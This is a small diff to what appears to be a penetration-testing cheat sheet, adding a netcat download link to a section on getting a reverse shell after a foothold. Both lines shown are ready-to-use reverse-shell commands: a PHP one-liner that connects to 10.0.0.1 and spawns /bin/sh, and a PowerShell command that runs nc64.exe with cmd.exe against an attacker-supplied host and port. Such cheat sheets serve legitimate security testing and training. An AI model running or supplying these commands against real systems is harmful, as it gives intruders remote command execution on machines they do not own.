@@ -1865,4 +1865,4 @@ php -r '$sock=fsockopen("10.0.0.1",80);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
 
 What to do - I have a foothold how do I get a reverse shell?
 
-- `powershell -c cd C:\Users\myuser\Downloads; .\nc64.exe -e cmd.exe myip myport`
+- `powershell -c cd C:\Users\myuser\Downloads; .\nc64.exe -e cmd.exe myip myport` [nc](https://github.com/int0x33/nc.exe/tree/master)
